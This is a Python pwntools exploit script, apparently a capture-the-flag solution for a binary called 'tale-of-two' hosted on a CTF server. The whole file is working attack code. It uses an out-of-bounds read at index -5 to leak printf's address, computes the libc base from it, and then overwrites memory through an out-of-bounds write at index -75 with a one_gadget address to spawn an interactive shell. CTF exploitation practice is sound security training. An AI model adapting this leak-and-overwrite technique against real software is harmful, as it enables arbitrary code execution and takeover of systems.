from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./tale-of-two')
	raw_input('debug')
	printf_offset = 0x64f00
	one_gadget = 0x4f3c2 
else:
	host, port = 'challenges.ctfd.io', 30250
	r = remote(host,port)
	libc = ELF('./libc.so.6')
	printf_offset = libc.symbols['printf']
	one_gadget = 0x4f322 



r.sendlineafter('Where do you want to read?\n', '-5')
res = '0x' + r.recv(12)
printf_add = int(res,16)
libc_base = printf_add - printf_offset
log.info('%#x' %libc_base)
log.info('%#x' %printf_offset)
r.sendlineafter('Where do you want to write?\n', '-75')
r.sendlineafter('What do you want to write?\n', str(libc_base+one_gadget))

r.interactive()
r.close()

# FLAG